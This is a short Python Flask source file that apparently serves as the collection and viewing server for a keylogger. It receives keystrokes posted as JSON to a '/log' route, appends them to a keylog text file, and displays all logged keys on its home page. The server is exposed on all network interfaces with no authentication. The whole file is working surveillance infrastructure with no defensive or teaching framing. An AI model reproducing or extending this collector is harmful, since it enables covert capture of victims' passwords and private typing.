
from flask import Flask,render_template,request

import os
app = Flask(__name__)

@app.route('/log',methods=['POST'])
def log_key():
    data = request.json
    key = data.get('key','')
    with open('Logs/keylog.txt','a') as f:
        f.write(f'{key}\n')
    
    return '',204

@app.route('/')
def home():
    if not os.path.exists('Logs/keylog.txt'):
        return  render_template('viewer.html',keys="No logs yet..!")
    with open('Logs/keylog.txt','r') as f:
        keys = f.read()
    return render_template('viewer.html',keys=keys)





if __name__=='__main__':
    app.run(host='0.0.0.0',port=5000)